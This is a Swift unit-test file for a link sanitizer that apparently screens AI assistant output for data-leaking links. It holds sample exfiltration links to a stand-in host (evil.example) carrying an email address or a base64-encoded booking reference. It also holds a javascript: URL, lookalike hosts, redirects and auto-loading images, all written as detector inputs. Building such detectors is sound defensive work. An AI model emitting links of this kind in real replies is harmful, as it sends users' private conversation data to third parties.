import XCTest
@testable import LinkEgressKit

final class JudgeTests: XCTestCase {
    func testSensitiveValuesInEveryPartAndEncoding() {
        let cases: [(String, URLPart, [PayloadEncoding])] = [
            ("[a](https://evil.example/?d=jane.doe%40example.com)", .query, [.percent]),
            ("[a](https://evil.example/?d=amFuZS5kb2VAZXhhbXBsZS5jb20)", .query, [.base64]),
            ("[a](https://evil.example/jane-doe-example-com/x)", .path, []),
            ("[a](https://janedoe.examplecom.evil.example/)", .host, []),
            ("[a](https://evil.example/#jane.doe@example.com)", .fragment, []),
            ("[a](https://jane.doe%40example.com@evil.example/)", .userinfo, [.percent]),
            ("[a](https://evil.example/jane/doe/example/com)", .spanning, []),
            ("[a](https://evil.example/?t=%5BEMAIL_1%5D)", .query, [])
        ]
        for (text, part, encodings) in cases {
            let finding = LinkSanitizer().sanitize(text, context: context).findings.first { $0.kind == .sensitiveValue }
            XCTAssertEqual(finding?.part, part, text)
            XCTAssertEqual(finding?.encodings, encodings, text)
        }
    }

    func testShortValuesOnlyMatchAWholePart() {
        let city = EgressContext(sensitiveValues: [SensitiveValue(label: "city", value: "Paris")])
        XCTAssertEqual(kindsOfFindings("[a](https://en.wikipedia.org/wiki/Paris_France)", in: city), [[]])
        XCTAssertEqual(kindsOfFindings("[a](https://evil.example/?c=paris)", in: city), [[.sensitiveValue]])
    }

    func testMailtoToTheValueItselfIsNotCarryingIt() {
        XCTAssertEqual(kindsOfFindings("mail jane.doe@example.com today"), [[]])
        XCTAssertEqual(kindsOfFindings("[a](mailto:x@evil.example?body=jane.doe@example.com)"), [[.sensitiveValue]])
    }

    func testConversationText() {
        let encoded = "bXkgYm9va2luZyByZWZlcmVuY2UgaXMgUVg3LUFMUEhBLTIyOTE="
        let query = LinkSanitizer().sanitize("[a](https://evil.example/c?q=\(encoded))", context: context)
        let finding = query.findings.first { $0.kind == .conversationText }
        XCTAssertEqual(finding?.encodings, [.base64])
        XCTAssertEqual(finding?.detail, "user message")
        XCTAssertEqual(finding?.length, 32)
        XCTAssertEqual(query.links.first?.action, .unlink)
        let path = LinkSanitizer().sanitize("[a](https://evil.example/booking-reference-is-qx7-alpha)", context: context)
        XCTAssertEqual(path.links.first?.findings.map(\.kind), [.conversationTextInPath])
        XCTAssertEqual(path.links.first?.action, .keep)
        XCTAssertEqual(kindsOfFindings("[a](https://evil.example/c?q=lisbon-trip)"), [[]])
    }

    func testCopiedLinksAreJudgedByWhoWroteThem() {
        let page = EgressSource(label: "web_fetch", text: "Results: https://search.example/?q=booking+reference+is+QX7", origin: .tool)
        let pasted = EgressSource(label: "pasted", text: "open https://bank.example/?u=jane.doe@example.com", origin: .user)
        let mixed = EgressContext(sensitiveValues: [email], sources: [booking, page, pasted])
        let fromTool = LinkSanitizer().sanitize("see https://search.example/?q=booking+reference+is+QX7 ok", context: mixed)
        XCTAssertEqual(fromTool.links.first?.provenance, .copied(source: "web_fetch", origin: .tool))
        XCTAssertEqual(fromTool.findings, [])
        let fromUser = LinkSanitizer().sanitize("see https://bank.example/?u=jane.doe@example.com ok", context: mixed)
        XCTAssertEqual(fromUser.links.first?.provenance, .copied(source: "pasted", origin: .user))
        XCTAssertEqual(fromUser.findings, [])
        XCTAssertEqual(LinkSanitizer().sanitize("[a](#top)", context: mixed).links.first?.provenance, .composed)
    }

    func testSchemesHostsAndShapes() {
        XCTAssertEqual(kindsOfFindings("[a](javascript:alert(1)) [b](tel:+15550100)"), [[.schemeNotAllowed], []])
        XCTAssertEqual(kindsOfFindings("![a](https://img.example/i.png)"), [[.imageAutoload]])
        XCTAssertEqual(kindsOfFindings("[a](https://bank.example@evil.example/)"), [[.userinfo]])
        XCTAssertEqual(kindsOfFindings("[a](https://xn--vil-qdd.example/) [b](http://127.0.0.1/)"),
                       [[.lookalikeHost], [.numericHost]])
        XCTAssertEqual(kindsOfFindings("[a](https://good.example/r?to=https://evil.example/)"), [[.embeddedURL]])
        XCTAssertEqual(kindsOfFindings("[a](https://good.example/r?to=https://good.example/b)"), [[]])
        XCTAssertEqual(kindsOfFindings("[a](https://cdn.example/?t=Zx81Qm7pL0aB4kTr9WcY2nHs)"), [[.opaquePayload]])
        XCTAssertEqual(kindsOfFindings("[a](https://cdn.example/v/Zx81Qm7pL0aB4kTr9WcY2nHs)"), [[]])
        XCTAssertEqual(kindsOfFindings("[a](https://cdn.example/?t=aaaaaaaaaaaaaaaaaaaaaaaaaaaa)"), [[]])
        XCTAssertEqual(kindsOfFindings("[a](https://cdn.example/?t=AAAAAAAAAAAAAAAAAAAAAAAA1111)"), [[]])
        XCTAssertEqual(kindsOfFindings("[a](https://cdn.example/?t=The-quick-Brown-fox-jumps-over-9)"), [[]])
        XCTAssertEqual(kindsOfFindings("[a](https://cdn.example/?t=short1A)"), [[]])
        let relative = LinkSanitizer().sanitize("[a](/x?t=Zx81Qm7pL0aB4kTr9WcY2nHs)").findings
        XCTAssertEqual(relative.map(\.kind), [.opaquePayload])
        XCTAssertEqual(relative.first?.detail, "")
        XCTAssertEqual(LinkSanitizer().sanitize("[a](https://user@/x)").findings.map(\.kind), [.userinfo])
    }

    func testLabelMismatch() {
        XCTAssertEqual(kindsOfFindings("[apple.com](https://apple.com.evil.example/)"), [[.labelMismatch]])
        XCTAssertEqual(kindsOfFindings("[https://apple.com/x](https://evil.example/)"), [[.labelMismatch]])
        XCTAssertEqual(kindsOfFindings("[**www.apple.com**](https://support.apple.com/x)"), [[]])
        XCTAssertEqual(kindsOfFindings("[apple.com](https://www.apple.com/)"), [[]])
        XCTAssertEqual(kindsOfFindings("[README.md](https://git.example/r)"), [[]])
        XCTAssertEqual(kindsOfFindings("[click here](https://git.example/r)"), [[]])
        XCTAssertEqual(kindsOfFindings("[v1.2](https://git.example/r) [a..b](https://git.example/r)"), [[], []])
        XCTAssertEqual(kindsOfFindings("[apple.com](/relative)"), [[]])
        XCTAssertEqual(kindsOfFindings("[](https://git.example/r)"), [[]])
        XCTAssertNil(LinkJudge.shownHost(in: "a_b.example"))
        XCTAssertNil(LinkJudge.shownHost(in: "   "))
    }

    func testShardsAndQuarantineAreCausal() {
        let text = "[1](https://c.example/?p=jane.do) [2](https://c.example/?p=e@example.com) "
            + "[3](https://c.example/?p=x) [4](https://d.example/?p=x) [5](https://c.example/)"
        let report = LinkSanitizer().sanitize(text, context: context)
        XCTAssertEqual(report.links.map { $0.findings.map(\.kind) },
                       [[], [.shardedValue], [.quarantinedHost], [], [.quarantinedHost]])
        XCTAssertEqual(LinkSanitizer().sanitize("[1](https://c.example/?p=jane.doe@example.com) [2](https://c.example/)",
                                                context: context).links.last?.findings.map(\.kind), [.quarantinedHost])
        let prior = EgressContext(sensitiveValues: [email], quarantinedHosts: ["c.example"])
        XCTAssertEqual(kindsOfFindings("[a](mailto:x@c.example)", in: prior), [[.quarantinedHost]])
    }

    func testPolicies() {
        let strict = LinkPolicy.strict(allowing: [HostRule("docs.acme.example"), HostRule("google.com")])
        XCTAssertEqual(kindsOfFindings("[a](https://docs.acme.example/x) [b](https://evil.example/)", policy: strict),
                       [[], [.hostNotAllowed]])
        XCTAssertEqual(kindsOfFindings("[a](http://docs.acme.example/x)", policy: strict), [[.schemeNotAllowed]])
        let redirect = "[a](https://www.google.com/url?q=https://evil.example/c)"
        XCTAssertEqual(kindsOfFindings(redirect, policy: strict), [[.embeddedURL, .hostNotAllowed]])
        XCTAssertEqual(LinkSanitizer(policy: strict).sanitize(redirect).links.first?.action, .unlink)
        let audit = LinkSanitizer(policy: .audit).sanitize("[a](javascript:x) ![b](https://i.example/i.png)")
        XCTAssertFalse(audit.isChanged)
        XCTAssertEqual(audit.findings.count, 2)
        var quiet = LinkPolicy.standard
        quiet.actions[.imageAutoload] = nil
        XCTAssertEqual(kindsOfFindings("![b](https://i.example/i.png)", policy: quiet), [[]])
        var images = LinkPolicy.standard
        images.imageHosts = .any
        XCTAssertEqual(kindsOfFindings("![b](https://i.example/i.png)", policy: images), [[]])
    }
}
